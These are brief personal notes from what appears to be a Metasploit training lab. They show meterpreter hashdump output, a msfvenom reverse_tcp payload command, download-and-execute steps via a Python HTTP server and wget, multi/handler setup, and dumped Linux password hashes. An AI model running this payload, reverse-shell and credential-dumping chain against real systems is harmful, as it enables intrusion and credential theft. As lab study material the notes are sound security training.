# Metasploit: Exploitation

I was pretty confused with the NTLM hash for a while. I couldn't figure how to get it from within Windows from the DOS prompt. I'm sure it's possible. 

We really want a meterpreter shell there not the DOS prompt (command line, sorry). So I tried payload 9 which offers a meterpreter prompt on a Windows platform and luckily got this:

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:**8ce9a3ebd1647fcc5e04025019f4b875**:::


msfvenom

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.X.X.X LPORT=XXXX -f elf > shell.elf

python3 -m http.server 9000

wget 10.X.X.X:9000/shell.elf
chmod +x shell.elf
./shell.elf (after starting multi/handler)

msfconsole:
search multi/handler
use 6 (this might be different) (use exploit/multi/handler)
set LHOST 10.X.X.X
set LPORT 4444
set payload payload/linux/x86/meterpreter/reverse_tcp
run

first I tried port 7777 but this seems to be already in use on the attackbox?
Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:7777)
So used port 4444

then at meterpreter prompt:
meterpreter > run post/linux/gather/hashdump

Get hashdump! Clear!

[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /root/.msf4/loot/20221208130522_default_10.10.133.201_linux.hashes_025374.txt